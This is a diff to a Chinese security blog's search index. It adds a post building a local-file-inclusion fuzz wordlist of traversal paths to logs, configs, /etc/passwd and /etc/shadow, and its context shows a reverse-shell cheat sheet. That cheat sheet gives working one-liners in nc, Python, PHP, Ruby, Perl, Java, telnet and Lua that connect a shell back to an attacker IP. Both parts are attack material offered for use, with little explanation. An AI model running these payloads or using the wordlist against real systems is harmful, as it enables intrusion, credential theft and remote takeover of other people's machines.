@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[记一次LFI-Fuzz字典构造]]></title>
+    <url>%2F2019%2F04%2F01%2FLFI-Fuzz%2F</url>
+    <content type="text"><![CDATA[Fuzz字典构造的必要性当遇到一处文件包含漏洞时，一般操作大致如下 包含源码进行代码审计 包含文件(如日志)进行GetShell 包含配置文件获得敏感信息 对于后两个而言，手动一个个的去进行测试无疑是不够优雅的所以就有了这次字典构造。 Linux文件路径收集 对于路径来说是有绝对路径和相对路径两种，考虑到限制路径的可能性将以下所有目录加上多个../以保证在相对路径时达到绝对路径的效果../../../../../../../../../../* Apache日志/var/log/apache/access.log/var/log/apache/access_log /var/log/apache/error_log /var/log/apache/error.log /var/log/apache2/access.log/var/log/apache2/access_log/var/log/apache2/error.log/var/log/apache2/error_log/usr/local/apache/logs/access_log /usr/local/apache/logs/access.log /usr/local/apache/logs/error_log /usr/local/apache/logs/error.log /usr/local/apache2/logs/access_log /usr/local/apache2/logs/access.log /usr/local/apache2/logs/error_log /usr/local/apache2/logs/error.log /usr/local/app/apache/logs/access_log /usr/local/app/apache/logs/access.log /usr/local/app/apache/logs/error_log /usr/local/app/apache/logs/error.log /usr/local/app/apache2/logs/access_log /usr/local/app/apache2/logs/access.log /usr/local/app/apache2/logs/error_log /usr/local/app/apache2/logs/error.log WWW日志/var/www/logs/access.log/var/www/logs/access_log/var/www/logs/error_log/var/www/logs/error.log/var/log/access.log/var/log/access_log /var/log/error.log/var/log/error_log/var/log/httpd/access_log /var/log/httpd/error_log/var/log/httpd/access.log /var/log/httpd/error.log/etc/httpd/logs/acces_log /etc/httpd/logs/acces.log /etc/httpd/logs/error_log /etc/httpd/logs/error.log /etc/httpd/conf/httpd.conf SSH日志/var/log/secure/var/log/auth.log FTP日志/var/log/messages 配置文件#mysql 配置文件/etc/my.conf#Apache2默认配置文件/usr/local/app/apache2/conf/httpd.conf/usr/local/app/apache2/conf/extra/httpd-vhost.conf#PHP相关配置/usr/local/app/php5/lib/php.ini#用户&amp;密码信息/etc/passwd/etc/shadow Session/var/lib/php/session/sess_+sessionid Win文件路径收集FTP日志 ex+年份的末两位数字+月份+日期，如2019年4月02日的WWW日志文件是ex190402.log %systemroot%/system32/logfiles/msftpsvc1/ex190402.log WWW日志 ex+年份的末两位数字+月份+日期。如2019年4月02日的WWW日志文件是ex190402.log %systemroot%/system32/logfiles/w3svc1/ex190402.log 配置文件%systemroot%\system32\inetsrv\MetaBase.xml #IIS配置文件%systemroot%\php.ini #php配置信息c:\ProgramFiles\mysql\my.ini #MySQL配置 最后除去一些比较特殊没法通用化的，那么一份热乎乎的Fuzz字典就这么出炉啦!]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Linux花式弹shell指南]]></title>
     <url>%2F2019%2F03%2F26%2Freverse-shell%2F</url>
     <content type="text"><![CDATA[nc nc -lvvp port nc -e /bin/bash ip port Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.239.131",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' Telnettelnet 192.168.220.131 6666 | /bin/bash | telnet 192.168.220.131 6665nc -lvvp 6666 #命令传输窗口nc -lvvp 6665 #命令结果显示窗口 mknod test p &amp;&amp; telnet 192.168.220.131 6666 0&lt;test | /bin/bash 1&gt;testnc -lvvp 6666 PHP php -r '$sock=fsockopen("192.168.220.131",6666);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");' &lt;?php$sock = fsockopen('192.168.220.131', 6666);$descriptorspec = array( 0 =&gt; $sock, 1 =&gt; $sock, 2 =&gt; $sock ); $process = proc_open('/bin/sh', $descriptorspec, $pipes); proc_close($process);?&gt; Ruby *ruby -rsocket -e 'f=TCPSocket.open("192.168.220.131",6666).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.220.131","6666");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end' Perl perl -e 'use Socket;$i="192.168.220.131";$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;' Java Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"&#125;);p.waitFor();Runtime r = Runtime.getRuntime();Process p = r.exec(new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1"&#125;);p.waitFor(); Lua lua -e "require('socket');require('os');t=socket.tcp();t:connect('192.168.220.131','6666');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"]]></content>
@@ -119,9 +130,9 @@
         <category>Web安全</category>
       </categories>
       <tags>
+        <tag>文件包含</tag>
         <tag>渗透测试</tag>
         <tag>Web安全</tag>
-        <tag>文件包含</tag>
       </tags>
   </entry>
   <entry>
